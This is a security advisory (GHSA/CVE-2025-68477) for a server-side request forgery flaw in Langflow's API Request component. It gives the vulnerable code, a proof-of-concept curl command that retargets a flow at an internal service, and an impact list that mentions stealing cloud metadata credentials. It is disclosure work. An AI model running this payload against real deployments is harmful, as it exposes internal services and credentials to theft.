# [H] Langflow vulnerable to Server-Side Request Forgery

## Summary
Severity: High
Advisory: GHSA-5993-7p27-66g5
CVE: CVE-2025-68477
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2025-12-19
Source: https://github.com/advisories/GHSA-5993-7p27-66g5
Type: github-advisory

## Affected
- PyPI: `langflow` — affected >=0 <1.7.1

## Details
**Vulnerability Overview**


Langflow provides an API Request component that can issue arbitrary HTTP requests within a flow. This component takes a user-supplied URL, performs only normalization and basic format checks, and then sends the request using a server-side httpx client. It does not block private IP ranges (127.0.0.1, the 10/172/192 ranges) or cloud metadata endpoints (169.254.169.254), and it returns the response body as the result.

Because the flow execution endpoints (/api/v1/run, /api/v1/run/advanced) can be invoked with just an API key, if an attacker can control the API Request URL in a flow, non-blind SSRF is possible—accessing internal resources from the server’s network context. This enables requests to, and collection of responses from, internal administrative endpoints, metadata services, and internal databases/services, leading to information disclosure and providing a foothold for further attacks.

**Vulnerable Code**
 
1. When a flow runs, the API Request URL is set via user input or tweaks, or it falls back to the value stored in the node UI.
    
    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/backend/base/langflow/api/v1/endpoints.py#L349-L359
    
    ```python
    @router.post("/run/{flow_id_or_name}", response_model=None, response_model_exclude_none=True)
    async def simplified_run_flow(
        *,
        background_tasks: BackgroundTasks,
        flow: Annotated[FlowRead | None, Depends(get_flow_by_id_or_endpoint_name)],
        input_request: SimplifiedAPIRequest | None = None,
        stream: bool = False,
        api_key_user: Annotated[UserRead, Depends(api_key_security)],
        context: dict | None = None,
        http_request: Request,
    ):
    ```
    
    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/backend/base/langflow/api/v1/endpoints.py#L573-L588
    
    ```bash
    @router.post(
        "/run/advanced/{flow_id_or_name}",
        response_model=RunResponse,
        response_model_exclude_none=True,
    )
    async def experimental_run_flow(
        *,
        session: DbSession,
        flow: Annotated[Flow, Depends(get_flow_by_id_or_endpoint_name)],
        inputs: list[InputValueRequest] | None = None,
        outputs: list[str] | None = None,
        tweaks: Annotated[Tweaks | None, Body(embed=True)] = None,
        stream: Annotated[bool, Body(embed=True)] = False,
        session_id: Annotated[None | str, Body(embed=True)] = None,
        api_key_user: Annotated[UserRead, Depends(api_key_security)],
    ) -> RunResponse:
    ```
    
2. Normalization/validation stage: It only checks that the URL is non-empty and well-formed. No blocking of private networks, localhost, or IMDS.
    
    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L280-L289
    
    ```python
        def _normalize_url(self, url: str) -> str:
            """Normalize URL by adding https:// if no protocol is specified."""
            if not url or not isinstance(url, str):
                msg = "URL cannot be empty"
                raise ValueError(msg)
    
            url = url.strip()
            if url.startswith(("http://", "https://")):
                return url
            return f"https://{url}"
    ```
    
    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L433-L438
    
    ```python
            url = self._normalize_url(url)
    
            # Validate URL
            if not validators.url(url):
                msg = f"Invalid URL provided: {url}"
                raise ValueError(msg)
    ```
    
3. On the server side, it sends a request to an arbitrary URL using httpx.AsyncClient and exposes the response body as metadata["result"].
    
    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L312-L322
    
    ```python
            try:
                # Prepare request parameters
                request_params = {
                    "method": method,
                    "url": url,
                    "headers": headers,
                    "json": processed_body,
                    "timeout": timeout,
                    "follow_redirects": follow_redirects,
                }
                response = await client.request(**request_params)
    ```
    
    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L335-L340
    
    ```python
                # Base metadata
                metadata = {
                    "source": url,
                    "status_code": response.status_code,
                    "response_headers": response_headers,
                }
    ```
    
    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L364-L379
    
    ```python
                # Handle response content
                if is_binary:
                    result = response.content
                else:
                    try:
                        result = response.json()
                    except json.JSONDecodeError:
                        self.log("Failed to decode JSON response")
                        result = response.text.encode("utf-8")
    
                metadata["result"] = result
    
                if include_httpx_metadata:
                    metadata.update({"headers": headers})
    
                return Data(data=metadata)
    ```
    

### PoC

---

**PoC Description**
 
- I launched a Langflow server using the latest `langflowai/langflow:latest` Docker container, and a separate container `internal-api` that exposes an internal-only endpoint `/internal` on port 8000. Both containers were attached to the same user-defined network (`ssrf-net`), allowing communication by name or via the IP 172.18.0.3.
- I added an API Request node to a Langflow flow and set the URL to the internal service (`http://172.18.0.3:8000/internal`). Then I invoked `/api/v1/run/advanced/<FLOW_ID>` with an API key to perform SSRF. The response returned the internal service’s body in the `result` field, confirming non-blind SSRF.

**PoC**

- Langflow Setting
    
    <img width="1917" height="940" alt="image" src="https://github.com/user-attachments/assets/96b0d770-b260-440f-9205-1583c108e12f" />
    
- Exploit
    
    ```bash
    curl -s -X POST 'http://localhost:7860/api/v1/run/advanced/0b7f7713-d88c-4f92-bcf8-0dafe250ea9d' \
      -H 'Content-Type: application/json' \
      -H 'x-api-key: sk-HHc93OjH_4ep_EhfWrweP1IwpooJ3ZZnYOu-HgqJV4M' \
      --data-raw '{
        "inputs":[{"components":[],"input_value":""}],
        "outputs":["Chat Output"],
        "tweaks":{"API Request":{"url_input":"http://172.18.0.3:8000/internal","include_httpx_metadata":false}},
        "stream":false
      }' | jq -r '.outputs[0].outputs[0].results.message.text | sub("^```json\\n";"") | sub("\\n```$";"") | fromjson | .result'
    ```
    
    <img width="1918" height="1029" alt="image" src="https://github.com/user-attachments/assets/4883029f-bd56-4c23-b5a3-6f8a84dbcce1" />
    

### Impact

---

- Scanning internal assets and data exfiltration: Attackers can access internal administrative HTTP endpoints, proxies, metrics dashboards, and management consoles to obtain sensitive information (versions, tokens, configurations).
- Access to metadata services: In cloud environments, attackers can use 169.254.169.254, etc., to steal instance metadata and credentials.
- Foothold for attacking internal services: Can forge requests by abusing inter-service trust and become the starting point of an SSRF→RCE chain (e.g., invoking an internal admin API).
- Non-blind: Because the response body is returned to the client, attackers can immediately view and exploit the collected data.
- Risk in multi-tenant environments: Bypassing tenant boundaries can cause cross-leakage of internal network information, resulting in high impact. Even in single-tenant setups, the risk remains high depending on internal network policies.

## References
- https://github.com/langflow-ai/langflow/security/advisories/GHSA-5993-7p27-66g5
- https://nvd.nist.gov/vuln/detail/CVE-2025-68477
- https://github.com/langflow-ai/langflow
